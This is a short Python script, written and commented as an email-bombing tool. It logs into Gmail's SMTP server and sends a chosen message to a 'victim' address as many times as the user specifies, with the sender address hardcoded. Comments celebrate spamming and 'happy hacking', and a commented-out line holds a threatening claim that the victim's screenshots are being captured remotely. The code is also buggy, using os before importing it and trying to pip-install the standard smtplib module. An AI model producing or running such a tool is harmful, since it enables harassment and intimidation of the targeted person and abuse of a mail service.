#!usr/bin/python 
# script sends the emails non interactively ---> main purpose is to perform the spamming automatically ;;))/
try:
	import smtplib  # create smtp module to start the connection with the google's mail server diretly in non-interactive manner 
except:
	hide_cmd = os.system("pip install smtplib")
	
import os
import sys
server = smtplib.SMTP('smtp.gmail.com',587) # connecting with gmail smtp server with port number of 587 
    
server.starttls() # initiating the tls handshake while connecting to the server
    

email    = input("Enter Your Email : ")
			# password  = getpass.getpass("Enter your Password:")
		
password = input("please enter your password ")

   # authentication check 
if not  email  and not password:
	print ("User not logged in")
else:
	server.login(email,password)
	print ("Successfully Signed in")
	
	# victim information 
	send = input("Enter Your Victim Email : ")

	print("Amount of bombarding messages?") 
				
	mailnumber= int(input("Count : "))  # number of mail messeges to be sent 
				

	messagetovic = input("Enter Your Message :\n")
				
				

	for count in range(int(mailnumber)):
		server.sendmail("wifipwd9@gmail.com" , send , messagetovic)
		# server.sendmail(fromaddr, toaddrs, msg)
		
		# print (count,"Your system screenshots are captured remotely and sent to me, daily!!!! :)! : ")


	server.quit()
		# print("You have not Chosen 'gmail' ")			
# program ends. 
# happy hacking :)
# use carefully!
